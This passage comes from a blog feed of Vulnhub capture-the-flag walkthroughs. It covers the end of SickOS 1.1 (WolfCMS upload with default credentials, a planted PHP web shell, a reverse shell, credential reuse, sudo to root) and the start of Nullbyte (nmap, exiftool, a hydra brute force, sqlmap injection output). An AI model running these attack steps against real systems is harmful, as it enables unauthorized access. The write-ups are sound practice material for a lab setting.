+ http://localhost/index.php &lt;span class="o"&gt;(&lt;/span&gt;CODE:200&lt;span class="p"&gt;|&lt;/span&gt;SIZE:21&lt;span class="o"&gt;)&lt;/span&gt;                                                         
+ http://localhost/robots &lt;span class="o"&gt;(&lt;/span&gt;CODE:200&lt;span class="p"&gt;|&lt;/span&gt;SIZE:45&lt;span class="o"&gt;)&lt;/span&gt;                                                            
+ http://localhost/robots.txt &lt;span class="o"&gt;(&lt;/span&gt;CODE:200&lt;span class="p"&gt;|&lt;/span&gt;SIZE:45&lt;span class="o"&gt;)&lt;/span&gt;                                                        
+ http://localhost/server-status &lt;span class="o"&gt;(&lt;/span&gt;CODE:200&lt;span class="p"&gt;|&lt;/span&gt;SIZE:3906&lt;span class="o"&gt;)&lt;/span&gt;                                                   

-----------------
END_TIME: Fri Aug &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:45:58 &lt;span class="m"&gt;2016&lt;/span&gt;
DOWNLOADED: &lt;span class="m"&gt;4612&lt;/span&gt; - FOUND: &lt;span class="m"&gt;7&lt;/span&gt;
root@kali:~/Desktop/sickos# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Looking at robots.txt we see that the /wolfcms path is disallowed. Lets examine further. &lt;/p&gt;
&lt;p&gt;&lt;img alt="wolfcms.png" src="/images/wolfcms.png"&gt;&lt;/p&gt;
&lt;p&gt;Awesome we have more to work with. Given the nature of this engagement and a bit of a gut feeling, there is most likely a public exploit for this CMS. Sure enough, there &lt;a href="https://www.exploit-db.com/exploits/38000/"&gt;is&lt;/a&gt; :) Basically its a arbitrary file upload vulnerability that allows you to upload any php file, no restrictions. &lt;/p&gt;
&lt;p&gt;To get to the vulnerable file upload page we need to get admin access, the site was still configured with the default creds of admin:admin so all is well. &lt;/p&gt;
&lt;p&gt;&lt;img alt="wolfcms_admin.png" src="/images/wolfcms_admin.png"&gt;&lt;/p&gt;
&lt;p&gt;Apart from the capability to upload a file, we can also craft our own PHP file inside of the application itself.&lt;/p&gt;
&lt;p&gt;&lt;img alt="https://cdn.meme.am/instances/500x/56158060.jpg" src="https://cdn.meme.am/instances/500x/56158060.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Just to switch things up I figured I'd use the b347k shell instead of the standard php webshells you find on the internet (although this one is from the internet as well)....stealth is not the name of the game here.&lt;/p&gt;
&lt;p&gt;&lt;img alt="wolfcms_backdoor_creation.png" src="/images/wolfcms_backdoor_creation.png"&gt;&lt;/p&gt;
&lt;p&gt;Now we have our backdoor at /hello.php, giving us access as user www-data. While this is nice and all, I need a full shell to start escalating privileges. Lets set up nc to listen...&lt;/p&gt;
&lt;p&gt;&lt;img alt="nc_rs_catch.png" src="/images/nc_rs_catch.png"&gt;&lt;/p&gt;
&lt;p&gt;and reverse shell out...&lt;/p&gt;
&lt;p&gt;&lt;img alt="b374_reverse_shell_php.png" src="/images/b374_reverse_shell_php.png"&gt;&lt;/p&gt;
&lt;p&gt;While I'm performing my privilege escalation tricks (fantatic &lt;a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"&gt;guide&lt;/a&gt; by @g0tm1lk), I forgot that shells provided by nc suck cause you can't make a typo. So I need a better shell, hey I can be picky in this case :) Anyway, wolfcms has a mysql backend and investigating /var/www/wolfcms/config.php gives the credentials to the database. &lt;/p&gt;
&lt;p&gt;&lt;img alt="config_php.png" src="/images/config_php.png"&gt;&lt;/p&gt;
&lt;p&gt;Investigating /etc/passwd indicates the only "normal" user is 'sickos'. I'm willing to bet that the same credentials for mysql are the also for this user. Lets see if we can ssh in. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kali:~/Desktop/sickos# ssh -l sickos &lt;span class="m"&gt;192&lt;/span&gt;.168.61.177
sickos@192.168.61.177&lt;span class="s1"&gt;&amp;#39;s password: &lt;/span&gt;
&lt;span class="s1"&gt;Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)&lt;/span&gt;

&lt;span class="s1"&gt; * Documentation:  https://help.ubuntu.com/&lt;/span&gt;

&lt;span class="s1"&gt;  System information as of Fri Aug 12 22:53:00 IST 2016&lt;/span&gt;

&lt;span class="s1"&gt;  System load:  0.0               Processes:           121&lt;/span&gt;
&lt;span class="s1"&gt;  Usage of /:   4.3% of 28.42GB   Users logged in:     0&lt;/span&gt;
&lt;span class="s1"&gt;  Memory usage: 12%               IP address for eth0: 192.168.61.177&lt;/span&gt;
&lt;span class="s1"&gt;  Swap usage:   0%&lt;/span&gt;

&lt;span class="s1"&gt;  Graph this data and manage this system at:&lt;/span&gt;
&lt;span class="s1"&gt;    https://landscape.canonical.com/&lt;/span&gt;

&lt;span class="s1"&gt;124 packages can be updated.&lt;/span&gt;
&lt;span class="s1"&gt;92 updates are security updates.&lt;/span&gt;

&lt;span class="s1"&gt;New release &amp;#39;&lt;/span&gt;&lt;span class="m"&gt;14&lt;/span&gt;.04.3 LTS&lt;span class="s1"&gt;&amp;#39; available.&lt;/span&gt;
&lt;span class="s1"&gt;Run &amp;#39;&lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;-release-upgrade&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; to upgrade to it.

Last login: Fri Aug &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="m"&gt;22&lt;/span&gt;:46:51 &lt;span class="m"&gt;2016&lt;/span&gt; from &lt;span class="m"&gt;192&lt;/span&gt;.168.61.176
sickos@SickOs:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So what's cool here is the sickos user is a member of the sudoers group. It's one of the first things I try and it has worked on multiple engagements. This saves alot of time as you can drop into root as long as you known the current user's credentials. Let's grab the flag and we are out of here. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sickos@SickOs:~$ sudo su -
&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; sickos: 
Sorry, try again.
&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; sickos: 
root@SickOs:~# ls
a0216ea4d51874464078c618298b1367.txt
root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt 
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks &lt;span class="k"&gt;for&lt;/span&gt; Trying


root@SickOs:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When I get some time I think I'll move onto SickOS 1.2. I'll be publish more posts soon, with content other than vulnhub walkthrougt!&lt;/p&gt;
&lt;p&gt;Thanks for reading and happy hacking!&lt;/p&gt;</content><category term="ctf"></category><category term="vulnhub"></category><category term="tutorial"></category></entry><entry><title>Nullbyte Vulnhub Walkthrough</title><link href="https://markclayton.github.io/nullbyte-vulnhub-walkthrough.html" rel="alternate"></link><published>2015-12-10T08:23:00-06:00</published><updated>2015-12-10T08:23:00-06:00</updated><author><name>Mark Clayton</name></author><id>tag:markclayton.github.io,2015-12-10:/nullbyte-vulnhub-walkthrough.html</id><summary type="html">&lt;p&gt;First blog post. Lately I've been looking at ways to practice my skills as a pentester, and I figured CTFs and practice images would be the way to go. Something about &lt;a href="https://www.vulnhub.com/"&gt;Vulnhub&lt;/a&gt; attracting my attention after examining the lot. I believe this is a great way to practice on skills …&lt;/p&gt;</summary><content type="html">&lt;p&gt;First blog post. Lately I've been looking at ways to practice my skills as a pentester, and I figured CTFs and practice images would be the way to go. Something about &lt;a href="https://www.vulnhub.com/"&gt;Vulnhub&lt;/a&gt; attracting my attention after examining the lot. I believe this is a great way to practice on skills I use everyday on engagements, but also to rehash some techniques rarely used. Personally, I don't find myself reverse engineering an executable on every gig :) Anyway, I figured I would take a swing at &lt;a href="https://www.vulnhub.com/entry/nullbyte-1,126/"&gt;Nullbyte&lt;/a&gt; written by &lt;a href="https://twitter.com/@ly0nx"&gt;lyon&lt;/a&gt;.  Let's get started.&lt;/p&gt;
&lt;p&gt;After loading the image, first batter up...nmap. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Nmap 6.49BETA5 scan initiated Wed Dec  9 17:01:29 2015 as: nmap -T4 -A -v -oA nullbyte 192.168.61.147&lt;/span&gt;
Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.61.147
Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.00073s latency&lt;span class="o"&gt;)&lt;/span&gt;.
Not shown: &lt;span class="m"&gt;997&lt;/span&gt; closed ports
PORT    STATE SERVICE VERSION
&lt;span class="m"&gt;80&lt;/span&gt;/tcp  open  http    Apache httpd &lt;span class="m"&gt;2&lt;/span&gt;.4.10 &lt;span class="o"&gt;((&lt;/span&gt;Debian&lt;span class="o"&gt;))&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;_http-methods: GET HEAD POST OPTIONS
&lt;span class="p"&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.10 &lt;span class="o"&gt;(&lt;/span&gt;Debian&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;_http-title: Null Byte &lt;span class="m"&gt;00&lt;/span&gt; - level &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;111&lt;/span&gt;/tcp open  rpcbind &lt;span class="m"&gt;2&lt;/span&gt;-4 &lt;span class="o"&gt;(&lt;/span&gt;RPC &lt;span class="c1"&gt;#100000)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; rpcinfo: 
&lt;span class="p"&gt;|&lt;/span&gt;   program version   port/proto  service
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="m"&gt;100000&lt;/span&gt;  &lt;span class="m"&gt;2&lt;/span&gt;,3,4        &lt;span class="m"&gt;111&lt;/span&gt;/tcp  rpcbind
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="m"&gt;100000&lt;/span&gt;  &lt;span class="m"&gt;2&lt;/span&gt;,3,4        &lt;span class="m"&gt;111&lt;/span&gt;/udp  rpcbind
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="m"&gt;100024&lt;/span&gt;  &lt;span class="m"&gt;1&lt;/span&gt;          &lt;span class="m"&gt;43382&lt;/span&gt;/tcp  status
&lt;span class="p"&gt;|&lt;/span&gt;_  &lt;span class="m"&gt;100024&lt;/span&gt;  &lt;span class="m"&gt;1&lt;/span&gt;          &lt;span class="m"&gt;49406&lt;/span&gt;/udp  status
&lt;span class="m"&gt;777&lt;/span&gt;/tcp open  ssh     OpenSSH &lt;span class="m"&gt;6&lt;/span&gt;.7p1 Debian &lt;span class="m"&gt;5&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;protocol &lt;span class="m"&gt;2&lt;/span&gt;.0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="m"&gt;1024&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 &lt;span class="o"&gt;(&lt;/span&gt;DSA&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="m"&gt;2048&lt;/span&gt; &lt;span class="m"&gt;29&lt;/span&gt;:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;_  &lt;span class="m"&gt;256&lt;/span&gt; &lt;span class="m"&gt;60&lt;/span&gt;:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt;
MAC Address: &lt;span class="m"&gt;00&lt;/span&gt;:0C:29:95:8C:1C &lt;span class="o"&gt;(&lt;/span&gt;VMware&lt;span class="o"&gt;)&lt;/span&gt;
Device type: general purpose
Running: Linux &lt;span class="m"&gt;3&lt;/span&gt;.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux &lt;span class="m"&gt;3&lt;/span&gt;.2 - &lt;span class="m"&gt;3&lt;/span&gt;.19
Uptime guess: &lt;span class="m"&gt;0&lt;/span&gt;.048 days &lt;span class="o"&gt;(&lt;/span&gt;since Wed Dec  &lt;span class="m"&gt;9&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:52:33 &lt;span class="m"&gt;2015&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
Network Distance: &lt;span class="m"&gt;1&lt;/span&gt; hop
TCP Sequence Prediction: &lt;span class="nv"&gt;Difficulty&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;257&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Good luck!&lt;span class="o"&gt;)&lt;/span&gt;
IP ID Sequence Generation: All zeros
Service Info: OS: Linux&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
&lt;span class="m"&gt;1&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt;.73 ms &lt;span class="m"&gt;192&lt;/span&gt;.168.61.147

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class="c1"&gt;# Nmap done at Wed Dec  9 17:01:38 2015 -- 1 IP address (1 host up) scanned in 9.09 seconds&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We are working ssh on port 777, apache, and rpcbind. Apache first. I curl the website for the initial response. Not really necessary, more habitual. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl http://192.168.61.147/

&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Null Byte &lt;span class="m"&gt;00&lt;/span&gt; - level &lt;span class="m"&gt;1&lt;/span&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;center&amp;gt;
&amp;lt;img &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;main.gif&amp;quot;&lt;/span&gt;&amp;gt;
&amp;lt;p&amp;gt; If you search &lt;span class="k"&gt;for&lt;/span&gt; the laws of harmony, you will find knowledge. &amp;lt;/p&amp;gt;
&amp;lt;/center&amp;gt;   

&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Basically just an image, lets see what we have. &lt;/p&gt;
&lt;p&gt;&lt;img alt="Just an image?" src="/images/website.png"&gt;&lt;/p&gt;
&lt;p&gt;Okay it's really just an image, nothing else it seems. Maybe theres something in the image. My first thought it either metadata or stegonagraphy. Metadata first. After searching the net I come across a tool called &lt;a href="http://www.sno.phy.queensu.ca/~phil/exiftool/"&gt;exiftool&lt;/a&gt;, which is a pretty neat as it extracts the meta information about an image. I'm sure it does alot more, but for the purposes of this test I just need to read the data.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./exiftool main.gif

ExifTool Version Number         : &lt;span class="m"&gt;10&lt;/span&gt;.05
File Name                       : main.gif
Directory                       : .
File Size                       : &lt;span class="m"&gt;16&lt;/span&gt; kB
File Modification Date/Time     : &lt;span class="m"&gt;2015&lt;/span&gt;:12:09 &lt;span class="m"&gt;17&lt;/span&gt;:08:46-06:00
File Access Date/Time           : &lt;span class="m"&gt;2015&lt;/span&gt;:12:09 &lt;span class="m"&gt;17&lt;/span&gt;:09:09-06:00
File Inode Change Date/Time     : &lt;span class="m"&gt;2015&lt;/span&gt;:12:09 &lt;span class="m"&gt;17&lt;/span&gt;:08:46-06:00
File Permissions                : rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : &lt;span class="m"&gt;235&lt;/span&gt;
Image Height                    : &lt;span class="m"&gt;302&lt;/span&gt;
Has Color Map                   : No
Color Resolution Depth          : &lt;span class="m"&gt;8&lt;/span&gt;
Bits Per Pixel                  : &lt;span class="m"&gt;1&lt;/span&gt;
Background Color                : &lt;span class="m"&gt;0&lt;/span&gt;
Comment                         : P-&lt;span class="o"&gt;)&lt;/span&gt;: kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : &lt;span class="m"&gt;0&lt;/span&gt;.071
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Immediately the comment field jumps out, perhaps it's the "P-):"...winky face perhaps? Anyway, obviously we have a key to use. Given the webpage doesn't have any input fields, I figure why not try it as a directory. To my luck...success.&lt;/p&gt;
&lt;p&gt;&lt;img alt="use key as file path" src="/images/key.png"&gt;&lt;/p&gt;
&lt;p&gt;Okay now we are working with something. Examining the source code of this site gives me the following hint. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;center&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;form&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;action=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
Key:&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;key&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt; 
&lt;span class="nt"&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;&amp;lt;!-- this form isn&amp;#39;t connected to mysql, password ain&amp;#39;t that complex --!&amp;gt;html&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;HTTP Post request, with a password that "ain't" that complex...so it's an easy password...brute force? I break out hydra. I'm not to familiar with hydra (I don't do much password cracking) so it took awhile to get the switches to work correctly.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;hydra &lt;span class="m"&gt;192&lt;/span&gt;.168.61.147 http-form-post &lt;span class="s2"&gt;&amp;quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&amp;quot;&lt;/span&gt; -P /usr/share/wordlists/rockyou.txt -la &lt;span class="p"&gt;|&lt;/span&gt; tee nullbyte.hydra

Hydra v8.1 &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span class="k"&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class="k"&gt;for&lt;/span&gt; illegal purposes.

Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; starting at &lt;span class="m"&gt;2015&lt;/span&gt;-12-09 &lt;span class="m"&gt;17&lt;/span&gt;:16:53
&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; max &lt;span class="m"&gt;16&lt;/span&gt; tasks per &lt;span class="m"&gt;1&lt;/span&gt; server, overall &lt;span class="m"&gt;64&lt;/span&gt; tasks, &lt;span class="m"&gt;14344399&lt;/span&gt; login tries &lt;span class="o"&gt;(&lt;/span&gt;l:1/p:14344399&lt;span class="o"&gt;)&lt;/span&gt;, ~14008 tries per task
&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; attacking service http-post-form on port &lt;span class="m"&gt;80&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;http-post-form&lt;span class="o"&gt;]&lt;/span&gt; host: &lt;span class="m"&gt;192&lt;/span&gt;.168.61.147   login: a   password: elite
&lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; target successfully completed, &lt;span class="m"&gt;1&lt;/span&gt; valid password found
Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; finished at &lt;span class="m"&gt;2015&lt;/span&gt;-12-09 &lt;span class="m"&gt;17&lt;/span&gt;:17:16
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This took about 30 seconds surprisingly, password is "elite". Which brings me deeper into the site. &lt;/p&gt;
&lt;p&gt;&lt;img alt="Elite worked" src="/images/elite_success.png"&gt;&lt;/p&gt;
&lt;p&gt;Entering anything into the parameter gives you the a successful data fetch of what I assume are usernames. Playing around with the input your provide will sometimes give you one or two usernames. This definitely smells like sql injection. Given this is a practice image, I'm was sure sqli would come into play at some point.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sqlmap -u &lt;span class="s2"&gt;&amp;quot;http://192.168.61.147/kzMb5nVYJw/420search.php?usrtosearch=x&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; tee nullbyte.sql

         _
 ___ ___&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;_____ ___ ___  &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0-dev-nongit-20151017&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;_ -&lt;span class="p"&gt;|&lt;/span&gt; . &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="p"&gt;|&lt;/span&gt; .&lt;span class="s1"&gt;&amp;#39;| . |&lt;/span&gt;
&lt;span class="s1"&gt;|___|_  |_|_|_|_|__,|  _|&lt;/span&gt;
&lt;span class="s1"&gt;      |_|           |_|   http://sqlmap.org&lt;/span&gt;

&lt;span class="s1"&gt;[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&amp;#39;&lt;/span&gt;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible &lt;span class="k"&gt;for&lt;/span&gt; any misuse or damage caused by this program

&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; starting at &lt;span class="m"&gt;17&lt;/span&gt;:23:07

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:07&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing connection to the target URL
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:07&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="k"&gt;if&lt;/span&gt; the target URL is stable
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:08&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; target URL is stable
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:08&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="k"&gt;if&lt;/span&gt; GET parameter &lt;span class="s1"&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; is dynamic
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:08&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;WARNING&lt;span class="o"&gt;]&lt;/span&gt; GET parameter &lt;span class="s1"&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; does not appear dynamic
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:08&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; heuristic &lt;span class="o"&gt;(&lt;/span&gt;basic&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; shows that GET parameter &lt;span class="s1"&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; might be injectable &lt;span class="o"&gt;(&lt;/span&gt;possible DBMS: &lt;span class="s1"&gt;&amp;#39;MySQL&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:08&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="k"&gt;for&lt;/span&gt; SQL injection on GET parameter &lt;span class="s1"&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt;

it looks like the back-end DBMS is &lt;span class="s1"&gt;&amp;#39;MySQL&amp;#39;&lt;/span&gt;. Do you want to skip &lt;span class="nb"&gt;test&lt;/span&gt; payloads specific &lt;span class="k"&gt;for&lt;/span&gt; other DBMSes? &lt;span class="o"&gt;[&lt;/span&gt;Y/n&lt;span class="o"&gt;]&lt;/span&gt; 
&lt;span class="k"&gt;for&lt;/span&gt; the remaining tests, &lt;span class="k"&gt;do&lt;/span&gt; you want to include all tests &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;MySQL&amp;#39;&lt;/span&gt; extending provided level &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; and risk &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; values? &lt;span class="o"&gt;[&lt;/span&gt;Y/n&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;AND boolean-based blind - WHERE or HAVING clause&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;WARNING&lt;span class="o"&gt;]&lt;/span&gt; reflective value&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; found and filtering out
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; GET parameter &lt;span class="s1"&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; seems to be &lt;span class="s1"&gt;&amp;#39;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&amp;#39;&lt;/span&gt; injectable 
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause&amp;#39;&lt;/span&gt;
